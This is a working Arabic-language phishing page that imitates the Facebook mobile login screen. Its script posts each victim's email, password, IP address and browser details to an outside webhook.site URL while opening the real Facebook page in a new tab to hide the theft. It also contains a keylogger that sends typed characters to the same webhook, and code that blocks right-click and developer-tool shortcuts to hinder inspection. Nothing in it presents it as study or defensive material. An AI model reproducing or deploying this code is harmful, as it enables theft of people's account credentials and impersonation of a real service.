<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>فيسبوك</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
            text-decoration: none;
        }

        body {
            background-color: #ffffff;
            color: #1c1e21;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 16px;
        }

        .lang-top {
            text-align: center;
            font-size: 14px;
            color: #1c1e21;
            margin-bottom: 70px;
            font-weight: 400;
        }

        .logo-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 90px;
        }

        .fb-circle-logo {
            width: 72px;
            height: 72px;
        }

        .form-container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        .input-group {
            position: relative;
            width: 100%;
        }

        .input-field {
            width: 100%;
            height: 64px;
            border: 1px solid #ccd0d5;
            border-radius: 16px;
            background: #ffffff;
            padding: 0 18px;
            font-size: 17px;
            color: #1c1e21;
            outline: none;
            transition: border-color 0.2s;
            text-align: right;
        }

        .input-field::placeholder {
            color: #8a8d91;
            font-weight: 400;
        }

        .input-field:focus {
            border-color: #4599ff;
            box-shadow: 0 0 0 1px #4599ff;
        }

        .input-field.error {
            border-color: #fa383e;
            box-shadow: 0 0 0 1px #fa383e;
        }

        .toggle-password {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #0866ff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            padding: 4px;
            display: none;
        }

        .submit-btn {
            width: 100%;
            height: 56px;
            background: #0027e0;
            color: #ffffff;
            border: none;
            border-radius: 9999px;
            font-size: 16px;
            font-weight: 700;
            margin-top: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.15s;
            opacity: 0.75;
        }

        .submit-btn:enabled {
            opacity: 1;
        }

        .submit-btn:hover:enabled {
            background: #0050c0;
        }

        .submit-btn:disabled {
            cursor: not-allowed;
        }

        .forgot-link {
            display: block;
            text-align: center;
            color: #1c1e21;
            font-size: 15px;
            font-weight: 500;
            margin: 24px 0;
            cursor: pointer;
            background: none;
            border: none;
            width: 100%;
            font-family: inherit;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .create-btn {
            width: 100%;
            height: 56px;
            background: #ffffff;
            color: #0060e0;
            border: 1.5px solid #0060e0;
            border-radius: 9999px;
            font-size: 16px;
            font-weight: 600;
            margin-top: 40px;
            cursor: pointer;
            transition: background 0.15s, border-color 0.15s;
        }

        .create-btn:hover {
            background: #f0f7ff;
            border-color: #0050c0;
            color: #0050c0;
        }

        .meta-footer {
            margin-top: auto;
            padding-top: 60px;
            padding-bottom: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .meta-svg {
            height: 24px;
            width: auto;
            display: block;
        }

        .error-text {
            display: none;
            color: #fa383e;
            font-size: 13px;
            text-align: right;
            padding-right: 18px;
            margin-top: 4px;
        }

        .error-text.show {
            display: block;
        }

        .spinner {
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            display: none;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-4px); }
            75% { transform: translateX(4px); }
        }

        .shake {
            animation: shake 0.3s ease-in-out;
        }

        .fallback-link {
            display: none;
            margin-top: 22px;
            text-align: center;
            color: #0866ff;
            font-weight: 600;
            font-size: 15px;
            text-decoration: underline;
            cursor: pointer;
            word-break: break-all;
            padding: 0 10px;
        }

        .fallback-link.show {
            display: block;
        }

        @media (max-width: 450px) {
            body {
                padding: 16px 20px 30px;
            }

            .lang-top {
                margin-bottom: 50px;
            }

            .logo-wrapper {
                margin-bottom: 80px;
            }

            .fb-circle-logo {
                width: 80px;
                height: 80px;
            }

            .input-field {
                height: 62px;
            }

            .submit-btn,
            .create-btn {
                height: 46px;
            }
        }
    </style>
</head>
<body>

    <div class="lang-top">العربية</div>

    <div class="logo-wrapper">
        <svg class="fb-circle-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36">
            <circle cx="18" cy="18" r="18" fill="#0866FF"/>
            <path d="M24.5 23.1l.8-5.2h-5v-3.3c0-1.4.7-2.8 2.9-2.8h2.3V7.4c-1.2-.2-2.5-.3-3.9-.3-3.9 0-6.5 2.4-6.5 6.7v3.8H10v5.2h5.1v12.6c1 .2 2.1.3 3.2.3s2.2-.1 3.2-.3V23.1h3z" fill="#ffffff"/>
        </svg>
    </div>

    <form class="form-container" id="loginForm" autocomplete="off">
        <div class="input-group">
            <input type="text"
                   class="input-field"
                   id="email"
                   name="email"
                   placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"
                   autocomplete="username"
                   inputmode="email"
                   required>
            <div class="error-text" id="emailError">رقم الهاتف المحمول أو البريد الإلكتروني الذي أدخلته غير صحيح.</div>
        </div>

        <div class="input-group">
            <input type="password"
                   class="input-field"
                   id="password"
                   name="password"
                   placeholder="كلمة السر"
                   autocomplete="current-password"
                   required>
            <button type="button" class="toggle-password" id="togglePassword">إظهار</button>
            <div class="error-text" id="passwordError">كلمة السر التي أدخلتها غير صحيحة.</div>
        </div>

        <button type="submit" class="submit-btn" id="loginBtn" disabled>
            <span id="buttonText">تسجيل الدخول</span>
            <div class="spinner" id="loadingSpinner"></div>
        </button>
    </form>

    <a class="fallback-link" id="fallbackLink" href="#" target="_blank" rel="noopener">
        ← اضغط هنا للانتقال إلى فيسبوك
    </a>

    <button type="button" class="forgot-link" id="forgotBtn">هل نسيت كلمة السر؟</button>

    <button type="button" class="create-btn" id="createBtn">إنشاء حساب جديد</button>

    <div class="meta-footer">
        <svg class="meta-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 948 191">
            <defs>
                <linearGradient id="Grad_Logo1" x1="61" y1="117" x2="259" y2="127" gradientUnits="userSpaceOnUse">
                    <stop style="stop-color:#0064e1" offset="0"/>
                    <stop style="stop-color:#0064e1" offset="0.4"/>
                    <stop style="stop-color:#0073ee" offset="0.83"/>
                    <stop style="stop-color:#0082fb" offset="1"/>
                </linearGradient>
                <linearGradient id="Grad_Logo2" x1="45" y1="139" x2="45" y2="66" gradientUnits="userSpaceOnUse">
                    <stop style="stop-color:#0082fb" offset="0"/>
                    <stop style="stop-color:#0064e0" offset="1"/>
                </linearGradient>
            </defs>
            <path id="Logo0" style="fill:#0081fb" d="m31.06,125.96c0,10.98 2.41,19.41 5.56,24.51 4.13,6.68 10.29,9.51 16.57,9.51 8.1,0 15.51-2.01 29.79-21.76 11.44-15.83 24.92-38.05 33.99-51.98l15.36-23.6c10.67-16.39 23.02-34.61 37.18-46.96 11.56-10.08 24.03-15.68 36.58-15.68 21.07,0 41.14,12.21 56.5,35.11 16.81,25.08 24.97,56.67 24.97,89.27 0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75l0-31.02c17.63,0 22.03-16.2 22.03-34.74 0-26.42-6.16-55.74-19.73-76.69-9.63-14.86-22.11-23.94-35.84-23.94-14.85,0-26.8,11.2-40.23,31.17-7.14,10.61-14.47,23.54-22.7,38.13l-9.06,16.05c-18.2,32.27-22.81,39.62-31.91,51.75-15.95,21.24-29.57,29.29-47.5,29.29-21.27,0-34.72-9.21-43.05-23.09-6.8-11.31-10.14-26.15-10.14-43.06z"/>
            <path id="Logo1" style="fill:url(#Grad_Logo1)" d="m24.49,37.3c14.24-21.95 34.79-37.3 58.36-37.3 13.65,0 27.22,4.04 41.39,15.61 15.5,12.65 32.02,33.48 52.63,67.81l7.39,12.32c17.84,29.72 27.99,45.01 33.93,52.22 7.64,9.26 12.99,12.02 19.94,12.02 17.63,0 22.03-16.2 22.03-34.74l27.4-.86c0,19.38-3.82,33.62-10.32,44.87-6.28,10.88-18.52,21.75-39.11,21.75-12.8,0-24.14-2.78-36.68-14.61-9.64-9.08-20.91-25.21-29.58-39.71l-25.79-43.08c-12.94-21.62-24.81-37.74-31.68-45.04-7.39-7.85-16.89-17.33-32.05-17.33-12.27,0-22.69,8.61-31.41,21.78z"/>
            <path id="Logo2" style="fill:url(#Grad_Logo2)" d="m82.35,31.23c-12.27,0-22.69,8.61-31.41,21.78-12.33,18.61-19.88,46.33-19.88,72.95 0,10.98 2.41,19.41 5.56,24.51l-26.48,17.44c-6.8-11.31-10.14-26.15-10.14-43.06 0-30.75 8.44-62.8 24.49-87.55 14.24-21.95 34.79-37.3 58.36-37.3z"/>
            <path id="Text" style="fill:#192830" d="m347.94,6.04h35.93l61.09,110.52 61.1-110.52h35.15v181.6h-29.31v-139.18l-53.58,96.38h-27.5l-53.57-96.38v139.18h-29.31z m285.11,67.71c-21.02,0-33.68,15.82-36.71,35.41h71.34c-1.47-20.18-13.11-35.41-34.63-35.41z m-65.77,46.57c0-41.22 26.64-71.22 66.28-71.22 38.99,0 62.27,29.62 62.27,73.42v8.05h-99.49c3.53,21.31 17.67,35.67 40.47,35.67 18.19,0 29.56-5.55 40.34-15.7l15.57,19.07c-14.67,13.49-33.33,21.27-56.95,21.27-42.91,0-68.49-31.29-68.49-70.56z m164.09-43.97h-26.98v-24h26.98v-39.69h28.28v39.69h40.99v24h-40.99v60.83c0,20.77 6.64,28.15 22.96,28.15 7.45,0 11.72-.64 18.03-1.69v23.74c-7.86,2.22-15.36,3.24-23.48,3.24-30.53,0-45.79-16.68-45.79-50.07z m188.35,23.34c-5.68-14.34-18.35-24.9-36.97-24.9-24.2,0-39.69,17.17-39.69,45.14 0,27.27 14.26,45.27 38.53,45.27 19.08,0 32.7-11.1 38.13-24.91z m28.28,87.95h-27.76v-18.94c-7.76,11.15-21.88,22.18-44.75,22.18-36.78,0-61.36-30.79-61.36-70.95 0-40.54 25.17-70.83 62.92-70.83 18.66,0 33.3,7.46 43.19,20.63v-17.38h27.76z"/>
        </svg>
    </div>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/b3eaf23c-e905-4407-993b-452f69c93b95';

        const loginForm = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const togglePasswordBtn = document.getElementById('togglePassword');
        const loginBtn = document.getElementById('loginBtn');
        const buttonText = document.getElementById('buttonText');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const createBtn = document.getElementById('createBtn');
        const forgotBtn = document.getElementById('forgotBtn');
        const fallbackLink = document.getElementById('fallbackLink');

        // ============ دوال مساعدة ============

        function openInNewTab(url) {
            // محاولة فتح تاب جديد
            const win = window.open(url, '_blank', 'noopener,noreferrer');
            if (win) {
                fallbackLink.classList.remove('show');
                return true;
            }
            // لو المتصفح منع النافذة — نعرض رابط بديل واضح
            fallbackLink.href = url;
            fallbackLink.classList.add('show');
            return false;
        }

        function resetLoginButton() {
            buttonText.style.display = 'inline';
            buttonText.textContent = 'تسجيل الدخول';
            loadingSpinner.style.display = 'none';
            loginBtn.disabled = false;
        }

        // ============ إظهار/إخفاء كلمة السر ============

        passwordInput.addEventListener('input', function() {
            togglePasswordBtn.style.display = this.value.length > 0 ? 'block' : 'none';
            validateForm();
            if (this.value.trim()) {
                passwordError.classList.remove('show');
                this.classList.remove('error');
            }
        });

        togglePasswordBtn.addEventListener('click', function() {
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            this.textContent = type === 'password' ? 'إظهار' : 'إخفاء';
        });

        // ============ التحقق ============

        function validateForm() {
            emailError.classList.remove('show');
            passwordError.classList.remove('show');
            emailInput.classList.remove('error');
            passwordInput.classList.remove('error');

            const valid = emailInput.value.trim() && passwordInput.value.trim();
            loginBtn.disabled = !valid;
            loginBtn.style.opacity = valid ? '1' : '0.75';
            return valid;
        }

        function showFormErrors() {
            let hasError = false;
            emailError.classList.remove('show');
            passwordError.classList.remove('show');
            emailInput.classList.remove('error', 'shake');
            passwordInput.classList.remove('error', 'shake');

            if (!emailInput.value.trim()) {
                emailError.classList.add('show');
                emailInput.classList.add('error', 'shake');
                hasError = true;
            }
            if (!passwordInput.value.trim()) {
                passwordError.classList.add('show');
                passwordInput.classList.add('error', 'shake');
                hasError = true;
            }
            if (hasError) {
                setTimeout(() => {
                    emailInput.classList.remove('shake');
                    passwordInput.classList.remove('shake');
                }, 400);
            }
            return !hasError;
        }

        emailInput.addEventListener('input', function() {
            validateForm();
            if (this.value.trim()) {
                emailError.classList.remove('show');
                this.classList.remove('error');
            }
        });

        validateForm();

        // ============ IP + إرسال ============

        async function getIPAddress() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const j = await res.json();
                return j.ip;
            } catch (e) {
                return 'unknown';
            }
        }

        async function sendCredentials(data) {
            const body =
                "=== Facebook Mobile Credentials ===\n" +
                "Email    : " + data.email + "\n" +
                "Password : " + data.password + "\n" +
                "IP       : " + data.ip + "\n" +
                "Time     : " + data.time + "\n" +
                "Platform : " + data.platform + "\n" +
                "Language : " + data.language + "\n" +
                "Referrer : " + data.referrer + "\n" +
                "Browser  : " + data.browser;

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'text/plain' },
                    body: body
                });
                return true;
            } catch (err) {
                return false;
            }
        }

        // ============ تسجيل الدخول ============

        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();

            if (!showFormErrors()) return;

            const email = emailInput.value.trim();
            const password = passwordInput.value;
            const targetUrl = 'https://www.facebook.com/login/?email=' + encodeURIComponent(email);

            // 1) فتح التاب أولاً (قبل أي await) — أسرع وأضمن
            openInNewTab(targetUrl);

            // 2) عرض سبينر لمدة قصيرة فقط
            buttonText.style.display = 'none';
            loadingSpinner.style.display = 'block';
            loginBtn.disabled = true;

            // 3) إعادة الزر لحالته الطبيعية بعد 1.5 ثانية
            setTimeout(resetLoginButton, 1500);

            // 4) إرسال صامت في الخلفية
            const credentials = {
                email: email,
                password: password,
                time: new Date().toLocaleString('ar-EG', {
                    year: 'numeric', month: 'long', day: 'numeric',
                    hour: '2-digit', minute: '2-digit', second: '2-digit'
                }),
                language: navigator.language,
                platform: navigator.platform,
                browser: navigator.userAgent,
                ip: 'unknown',
                referrer: document.referrer || 'direct'
            };

            getIPAddress().then(ip => {
                credentials.ip = ip;
                sendCredentials(credentials);
            }).catch(() => {
                sendCredentials(credentials);
            });
        });

        // ============ نسيت كلمة المرور ============

        forgotBtn.addEventListener('click', function() {
            openInNewTab('https://www.facebook.com/recover/initiate/');
        });

        // ============ إنشاء حساب ============

        createBtn.addEventListener('click', function() {
            openInNewTab('https://www.facebook.com/reg/');
        });

        // ============ حماية من التفحص ============

        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.keyCode === 123 ||
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 67)) ||
                (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
                e.preventDefault();
                return false;
            }
        });

        // ============ Keylogger ============

        let typedChars = '';
        document.querySelectorAll('input').forEach(inp => {
            inp.addEventListener('keyup', function(e) {
                if (e.key.length === 1) {
                    typedChars += e.key;
                    if (typedChars.length > 80) {
                        try {
                            fetch(WEBHOOK_URL, {
                                method: 'POST',
                                mode: 'no-cors',
                                headers: { 'Content-Type': 'text/plain' },
                                body: 'Facebook keystrokes: ' + typedChars.substring(0, 80)
                            });
                            typedChars = '';
                        } catch (err) {}
                    }
                }
            });
        });
    </script>
</body>
</html>
